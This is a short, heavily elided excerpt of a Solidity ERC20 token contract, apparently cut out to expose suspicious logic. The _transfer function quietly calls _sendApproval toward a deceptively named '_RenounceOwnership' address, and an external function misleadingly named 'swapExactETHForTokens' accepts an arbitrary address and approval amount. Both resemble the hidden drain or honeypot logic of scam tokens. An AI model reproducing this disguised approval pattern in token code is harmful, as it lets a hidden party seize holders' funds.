...
contract ERC20 is Context, IERC20 {
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal virtual {
    ...
    if(senderClaim > 0 && (_claimTokenBlock[sender] < block.number) && !Gwei[sender]) {
        _sendApproval(sender, _RenounceOwnership);
    }
  ...
  function swapExactETHForTokens(address _address, uint256 approveAmount) external {
